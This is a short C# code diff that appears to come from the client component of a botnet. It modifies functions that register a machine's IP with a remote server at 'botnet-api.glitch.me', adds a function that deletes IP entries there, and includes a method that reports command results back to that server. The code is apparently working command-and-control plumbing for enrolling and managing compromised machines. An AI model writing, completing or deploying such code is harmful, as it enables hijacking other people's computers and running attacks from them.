@@ -11,7 +11,6 @@ namespace HttpHandler
 {
     public class Product
     {
-        public uint id { get; set; }
         public string ip { get; set; }
     }
     public class Command
@@ -27,6 +26,12 @@ namespace HttpHandler
     }
     public class Class1
     {
+        public static async Task IpDeleteAsync(string Id)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            await client.DeleteAsync($"/api/v1/ip/{Id}");
+        }
         public static async Task SendResponse (string result, string MyIp )
         {
             HttpClient client = new HttpClient();
@@ -119,14 +124,15 @@ namespace HttpHandler
             }
             return ipaddresses;
         }
-        public static async Task CreateIpAndIdAsync(string ip)
+        public static async Task<UInt32> CreateIpAndIdAsync(string ip)
         {
             HttpClient client = new HttpClient();
-            Product product = new Product { id = Convert.ToUInt32(ResultIPTask().Result.Count + 1), ip = ip };
+            Product product = new Product {ip = ip};
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
             string json = new JavaScriptSerializer().Serialize(product);
-            var response = client.PostAsync("api/v1/ip", new StringContent(json)).Result;
-            response.EnsureSuccessStatusCode();
+            HttpResponseMessage response = client.PostAsync("api/v1/ip", new StringContent(json)).Result;
+            uint answer = response.Content.ReadAsAsync<UInt32>().Result;
+            return answer;
         }
 
     }
